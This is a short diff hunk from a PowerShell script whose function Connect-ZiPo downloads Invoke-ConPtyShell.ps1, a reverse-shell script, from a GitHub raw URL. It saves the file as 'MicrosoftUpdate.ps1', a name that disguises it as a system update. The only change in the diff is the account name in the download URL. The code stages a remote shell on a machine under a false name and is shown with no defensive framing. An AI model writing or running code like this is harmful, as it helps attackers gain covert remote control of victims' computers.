@@ -22,7 +22,7 @@ function Connect-ZiPo {
         }
 
         $targetPath = Join-Path $folder "MicrosoftUpdate.ps1"
-        $url = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1"
+        $url = "https://raw.githubusercontent.com/zip/studytime-/main/Invoke-ConPtyShell.ps1"
 
         Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $targetPath
 
